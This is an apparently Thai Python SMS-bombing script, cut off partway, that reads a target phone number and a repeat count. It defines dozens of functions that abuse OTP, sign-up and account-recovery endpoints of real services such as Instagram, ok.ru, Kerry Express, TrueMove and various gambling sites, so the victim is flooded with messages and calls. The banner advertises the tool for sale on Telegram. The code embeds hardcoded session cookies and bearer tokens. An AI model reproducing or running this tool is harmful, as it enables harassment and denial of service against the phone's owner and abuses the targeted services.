import requests,json
import threading
from requests import post,Session
import time
import requests,os,sys,threading
from requests import post
from re import search

os.system("clear")
print("""\033[1;96m ╔═════════════════════════════════════════════╗ """) 
print(""" \033[1;96m            [ ! ] เครดิต : WUT ch👽🔥🔥""")
print(""" \033[96m            [ ! ] WUT""")
print(""" \033[96m            [ ! ] สนใจซื้อ @ไอหน้าหี (ใน Telegram)""")
print (""" \033[96m            [ ! ]มีดีเลย์ด้วยนะอิอิ""")
print(""" \033[96m╚═════════════════════════════════════════════╝ """)


phone = input(f"\033[1;92m เบอร์:\033[80m ")
amount = int(input(f"\033[34m จํานวน:\033[31m "))
useragent = "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36"
os.system("clear")

def api1():
	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json

def api2():
    send = Session()
    send.headers.update({"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type" : "application/x-www-form-urlencoded","Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
    snd = send.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data=f"st.r.phone=+66{phone[1:]}")
    sed = send.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data="st.r.fieldAcceptCallUIButton=Call")


def api3():
	requests.post("https://api.zaapi.co/api/store/auth/otp/login",json={"phoneNumber":f"+66{phone[1:]}","namespace":"zaapi-buyers"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
		
def api4():
	requests.post("https://ufa3bb.com/account/register/sendotp", data=f"phone={phone}",headers={
	"x-requested-with": "XMLHttpRequest",
	"accept": "application/json, text/javascript, /; q=0.01",
	"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	"referer": "https://ufa3bb.com/account/register",
	"cookie": "_ga=GA1.2.1794924533.1639040857;ci_session=alj35so836p0d39gckneiqsuql03193n"})
    
def api5():
	headers = {
	    "content-type": "application/x-www-form-urlencoded",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
	    "cookie": "_gcl_au=1.1.1123274548.1637746846"
	    }
	requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0")
		
def api6():
	requests.post("https://api.jokerslotzz.com/public/request-otp",headers={
    "Host": "api.jokerslotzz.com",
"content-length": "25",
"accept": "application/json, text/plain, */*",
"content-type": "application/json;charset=UTF-8",
"sec-ch-ua-mobile": "?1",
"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"sec-ch-ua-platform": "Android",
"origin": "https://member.jokerslotzz.com","referer": "https://member.jokerslotzz.com/"
    },json={"username":f"{phone}"})
	
def api7():
	requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    
def api8():
	requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
		
def api9():
	requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-{phone}")
	
def api10():
	requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})
	
def api11():
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
    
def api12():
	requests.post("https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/"+phone)
	
def api13():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
		
def api14():
	head = {
	    "content-type": "application/json;charset=UTF-8",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "accept": "application/json, text/plain, */*",
	    "referer": "https://www.carsome.co.th/sell-car?gclsrc=aw.ds&&&utm_source=Google&utm_medium=Search&utm_campaign=TH_C2B_Valuation_SmartPhrase_Core_&utm_term=Search_Core_C2B_TH_Perf_Conv_&utm_content=%E0%B8%A3%E0%B8%96%E0%B8%A1%E0%B8%B7%E0%B8%AD%E0%B8%AA%E0%B8%AD%E0%B8%87%E0%B8%A3%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%96%E0%B8%B9%E0%B8%81&gclid=Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB",
	    "cookie": "_gcl_au=1.1.1272461332.1638187764;G_ENABLED_IDPS=google;_ga=GA1.3.808434087.1638187769;__lt__cid=10b9db7a-fed7-4a04-99d2-cdf99ccd76b8;_gid=GA1.3.1113186157.1639742520;_fbp=fb.2.1639742521800.1608632439;ajs_anonymous_id=fc77ca54-b140-4d14-a811-9be694d4dcfa;_hjSessionUser_1895262=eyJpZCI6IjJmYTg1NjkzLTIwYWUtNTQ3ZC1iYTgyLTZjMTZhNDE4N2VjOSIsImNyZWF0ZWQiOjE2Mzk3NDI1MjIzMDAsImV4aXN0aW5nIjp0cnVlfQ==;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;panoramaId_expiry=1640349594875;panoramaId=052fccf0cccc27f1f255389082ee16d53938c5a780adb183ac3642512b6c17dc;_clck=18ofz7k|1|exd|0;skylab_deviceId=IuD7oBeC61H6n41Z1FH3ek;_gcl_aw=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gcl_dc=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;amp_893e6b=IuD7oBeC61H6n41Z1FH3ek...1fn7egd40.1fn7egjki.1.3.4;__lt__sid=f6ad8bda-06d0796d;_gac_UA-70043720-5=1.1639853872.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gat_UA-70043720-5=1;_uetsid=23e4ae005f3111ec8d8c79ffb5e7c09b;_uetvid=33f5ca20510d11ec8e1175a84efe64f8;_hjSession_1895262=eyJpZCI6IjY2YWZlZmI0LWMwMDYtNGFkMS1hMWE3LTQ3NDllYmQ2MDNjYSIsImNyZWF0ZWQiOjE2Mzk4NTM4NzU4MDd9;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjIncludedInSessionSample=0;_clsk=15fms60|1639853877001|1|1|e.clarity.ms/collect"
	    }
	requests.post("https://www.carsome.co.th/website/login/sendSMS", headers=head, json={"username":phone,"optType":0}).json()
	
def api15():
	head = {
	    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..o2KGFaI9sj29aEhCf9hApg.8hkBGU4xqfvuMOjMnNVDZjwqkjUcapX7Nnm4r5NZ-LsHH54KqovZT8OcwskjsUoh0_8NKc7aBicXTwiVy-yR_lly-2hWlWsxCG8cR-ucaKrjhJPzHMoLHdw8TKNeeIq5kGuyTsmB-WVAxDn7G5-v0Q.RkQDS8sYQYMpTilU1VOz1A",
	    "content-type": "application/json; charset=utf-8",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "accept": "*/*",
	    "referer": "https://nocnoc.com/login",
	    "cookie": "_gcl_au=1.1.2015626896.1637433514;_ga=GA1.2.2121914407.1637433515;__lt__cid=4ba7a030-4806-44f7-b0bc-eb65b3b9b13f;_fbp=fb.1.1637433519859.82249249;_hjSessionUser_1027858=eyJpZCI6IjExYjI1OTM1LWExZmItNTNjZS1hN2RlLTc4YmQwMjQzNmRkZCIsImNyZWF0ZWQiOjE2Mzc0MzM1MTkwMjUsImV4aXN0aW5nIjp0cnVlfQ==;ajs_anonymous_id=%22b70a4a48-dc6e-407c-9a31-37cb925d24e0%22;__lt__sid=dfc427cb-21404fe4;_gid=GA1.2.1348859339.1639856210;_gat_gaTracker=1;_hjSession_1027858=eyJpZCI6Ijk5MWY0ZjhlLTI0MjAtNDA2YS05MjM0LTJkYTliMzU4OTBkYyIsImNyZWF0ZWQiOjE2Mzk4NTYyMTIyNzV9;_hjIncludedInSessionSample=0;_hjAbsoluteSessionInProgress=0;cto_bundle=hwhaQ19FRiUyRlI5b0h0T1B5YlBlUG1YQzBEWmlxUDhqWDNBT3Qyc0hKVXBsJTJCazNaUlJFMHVMem5DMEh3OEJYUFNnWUI1MGhiSGVkOG9ab3NoUjNMbSUyRnpUd2N4SWU3Q1lnYkZvUnZsJTJGZTVveldmRWliWW5SYWhrJTJCbkxNTmhOaFBSOGNrQlhDRmUwQVpaVW41Q3ElMkJ0Yk9yNVJjVGclM0QlM0Q;_gat_UA-124531227-1=1"
	    }
	requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684",headers=head,json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone":phone,"type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName":"ฟงฟง ฟงฟว"}})
	
def api16():
	requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={phone}",headers={
    "Accept": "application/json, text/plain, /",
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})

def api17():
	requests.post("https://m.pgwin168.com/api/register-otp",json ={"brands_id":"60e4016f35119800184f34a5","agent_register":"60e57c3b2ead950012fc5fba","tel": phone})
	
def api18():
	requests.post("https://www.som777.com/api/otp/register",json ={"applicant": phone,"serviceName":"SOM777"})
	
def api19():
	requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
	
def api20():
	requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})
	
def api21():
	requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": "0"+phone})

def api22():
	requests.post("https://globalapi.pointspot.co/papi/oauth2/signinWithPhone",json={"phoneNumber":"+66"+phone},headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36"})
	
def api23():
	requests.get(f"https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile={phone}")
	
def api24():
	requests.post("https://www.bigthailand.com/authentication-service/user/OTP", json={"locale":"th","phone": f"+66{phone[1:]}","email":"dkdk@gmail.com","userParams":{"buyerName":"ekek ks","activateLink":"www.google.com"}},headers={"content-type": "application/json","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg","cookie": "auth.strategy=local;auth._token.local=Bearer%20eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg;_utm_objs=eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6InJlZmVycmVyIiwidGlt%0D%0AZSI6MTY0MjMyOTM5OTU4NSwiY2hlY2tzdW0iOiJaMjl2WjJ4bExXTndZeTFoWkhkdmNtUnpMVEUy%0D%0ATkRJek1qa3pPVGsxT0RVPSJ9;_pk_ref.564990563.2c0e=%5B%22%22%2C%22%22%2C1642329400%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D;_pk_ses.564990563.2c0e=*;_gcl_au=1.1.833577636.1642329400;_asm_visitor_type=n;_ac_au_gt=1642329406505;cdp_session=1;_asm_uid=637506384;_ga=GA1.2.1026893832.1642329403;_gid=GA1.2.1437369318.1642329403;OptanonConsent=isIABGlobal=false&datestamp=Sun+Jan+16+2022+17%3A36%3A45+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.9.0&hosts=&consentId=e0fe7ec6-3c1e-4aa7-9e72-ecd2ed724416&interactionCount=0&landingPath=https%3A%2F%2Fwww.bigthailand.com%2Fcategory%2F850%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2581%25E0%25B8%25A5%25E0%25B8%25B0%25E0%25B8%2582%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2580%25E0%25B8%25AB%25E0%25B8%25A5%25E0%25B8%25A7%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%3Fgclid%3DCj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0007%3A1;_fbp=fb.1.1642329406623.363807498;_hjSessionUser_2738378=eyJpZCI6ImVkNmZhOGY3LTQwNDctNTNjMi04YTVjLTQ0OGE5MDA4YjhiZCIsImNyZWF0ZWQiOjE2NDIzMjk0MDQ4MDMsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample=0;_hjSession_2738378=eyJpZCI6ImNhN2UwZDFhLTZkNmQtNGM0Mi04YmI1LTg4NWJmNzZjMGExZCIsImNyZWF0ZWQiOjE2NDIzMjk0MTEwNzcsImluU2FtcGxlIjpmYWxzZX0=;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_gac_UA-165856282-1=1.1642329477.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_gcl_aw=GCL.1642329478.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_pk_id.564990563.2c0e=0.1642329400.1.1642329489.1642329400.;_ac_client_id=637515726.1642329496;_ac_an_session=zmzlzhzlzizqzmzjzkzjzdzlzgzkzmzizmzkzhzlzdzizlznzhzgzhzqznzqzlzdzizdzizlznzhzgzhzqznzqzlzdzizlznzhzgzhzqznzqzlzdzizdzgzjzizdzjzd2h25zdzgzdzezizd;au_id=637515726;_ga_80VN88PBVD=GS1.1.1642329399.1.1.1642329493.44"})
	
def api25():
	requests.post("https://api.cashmarket-th.com/app/userinfo/send/smsCode", json={"baseParams":{"platformId":"android","deviceType":"h5","deviceIdKh":"20220118121149smyjjs57jxtqbwkuu74y0vd6p5yzhrmp86872f73364d46d3bf9446ddd583ef61ee8fafe504bab46ec267ca96a99281d6rreqhrlgsg4p3srgv1i5s4pp8u9la6gf1","termSysVersion":"5.1.1","termModel":"A37f","brand":"","termId":"null","appType":"6","appVersion":"2.0.0","pValue":"","position":{"lon":"null","lat":"null"},"bizType":"0000","appName":"Cash Market","packageName":"com.cashmarketth.h5","screenResolution":"720,1280"},"clientTypeFlag":"h5","token":"","phoneNumber":"","timestamp":"1642479101529","bizParams":{"phoneNum":phone,"code":"null","type":200,"channelCode":"hJ071"}})
	
def api26():
	requests.post("https://bacara888.com/api/otp/register",json={"applicant":phone,"serviceName":"gclub"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","cookie":"_ga=GA1.2.600445810.1648202009;_gid=GA1.2.1634649368.1648202009;PHPSESSID=ehi2ceis3aph6d46ktk0819435;_gat_gtag_UA_136950045_1=1"})
	
def api27():
	requests.post("https://api.cdfoi9.com/api/v1/index.php", data=f"module=%2Fusers%2FgetVerificationCode&mobile={phone}&merchantId=111&domainId=0&accessId=&accessToken=&walletIsAdmin=",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded"})
		
def api28():
	requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2")
	
def api29():
	requests.post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})
    
def api30():
	head = {
	    "Host": "shopgenix.com",
	    "content-length": "37",
	    "sec-ch-ua-mobile": "?1",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	    "x-requested-with": "XMLHttpRequest",
	    "sec-ch-ua-platform": "Android",
	    "accept": "application/json, text/javascript, */*; q=0.01",
	    "origin": "https://shopgenix.com",
	    "referer": "https://shopgenix.com/app/5364874/",
	    "sec-fetch-site": "same-origin",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-dest": "empty"
	    }
	requests.post("https://shopgenix.com/api/sms/otp/",headers=head,data=f"mobile_country_id=1&mobile={phone}")
	
def api31():
	head = {
	    "x-requested-with": "XMLHttpRequest",
	    "accept": "application/json, text/javascript, */*; q=0.01",
	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "referer": "https://ufa3bb.com/account/register",
	    "cookie": "_ga=GA1.2.1794924533.1639040857;ci_session=alj35so836p0d39gckneiqsuql03193n"
	    }
	requests.post("https://ufa3bb.com/account/register/sendotp",headers=head,data=f"phone={phone}")
		
def api32():
	head = {
	    "Host": "users.cars24.co.th",
	    "x_vehicle_type": "CAR",
	    "accept": "application/json, text/plain, */*",
	    "sec-ch-ua-mobile": "?1",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "x_country": "TH",
	    "sec-ch-ua-platform": "Android",
	    "origin": "https://www.cars24.co.th",
	    "sec-fetch-site": "same-site",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-dest": "empty",
	    "referer": "https://www.cars24.co.th/",
	    "cookie": "_ga=GA1.3.31251861.1643986646;_gaexp=GAX1.3.PDQKIJpORiqz3sQ-b-n6dg.19097.1!6d55AMaSQSeBR3ISG4OEXQ.19110.1;_fbp=fb.2.1643986648656.1241126413;_gid=GA1.3.1399625525.1644221421;_dc_gtm_UA-65843992-28=1;_gat_UA-65843992-28=1;_hjSessionUser_2738441=eyJpZCI6IjY4OGUyODNkLTgxYzYtNTY5YS04ODMxLTFmMDY4N2I1YmVhMSIsImNyZWF0ZWQiOjE2NDM5ODY2NDcxOTAsImV4aXN0aW5nIjp0cnVlfQ==;_hjSession_2738441=eyJpZCI6IjBjNWQ3MDYxLTVlMmUtNGI2My1iMWFjLWVkNmY0OTIzNDI4ZiIsImNyZWF0ZWQiOjE2NDQyMjE0MjU4MDEsImluU2FtcGxlIjpmYWxzZX0=;_hjAbsoluteSessionInProgress=1;cto_bundle=jGdn019OJTJGRDNwa052ajI1cjBrT0JkeXJEVkxSOWM3NzF5RkpkbHhma3VwZ3NsM3YzOGpISVBsUyUyRm9UJTJCRSUyQkY2dThHQVFQd0VnWXE1MyUyRldHbnQlMkIwOHFzcFN2UFVtb0hmVnI4aTdZYUcyUHBBVG0lMkZRMnRVQjh5N2l5UnNGOG02SXlOOTg0MVVLeUxlNHBKZXFFUmVuRWFsUEFlZyUzRCUzRA",
	    }
	requests.get(f"https://users.cars24.co.th/oauth/consumer-app/otp/{phone}?lang=th",headers=head)
	
def api33():
	requests.post("https://api.thaisme.one/smegp/register/request-otp",json={"MOBILE":phone})
	
def api34():
	requests.post("https://app.droprich.co/agent/registergetsmsotp",data=f"phonenumber={phone}",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})
	
def api35():
	head = {
	    "Host": "gateway-sport.autoplay.cloud",
	    "content-length": "34",
	    "accept": "application/json",
	    "content-type": "application/json",
	    "sec-ch-ua-mobile": "?1",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "sec-ch-ua-platform": "Android",
	    "origin": "https://sport.autoplay.cloud",
	    "sec-fetch-site": "same-site",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-dest": "empty",
	    "referer": "https://sport.autoplay.cloud/"
	    }
	requests.post("https://gateway-sport.autoplay.cloud/iamrobot/frontend/user/send-otp",headers=head,json={"tel":phone,"prefix":"G8"})
	
def api36():
	requests.post("https://apiv3.slot999ss.com/front/api/register/set/OTP",data=f"phone={phone}",headers={"content-type": "application/x-www-form-urlencoded;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
	
def api37():
	head = {
	    "Host": "id.zilingo.com",
	    "content-length": "153",
	    "accept": "application/json, text/plain, */*",
	    "content-type": "application/json",
	    "x-requested-with": "XMLHttpRequest",
	    "sec-ch-ua-mobile": "?1",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "sec-ch-ua-platform": "Android",
	    "origin": "https://id.zilingo.com",
	    "sec-fetch-site": "same-origin",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-dest": "empty",
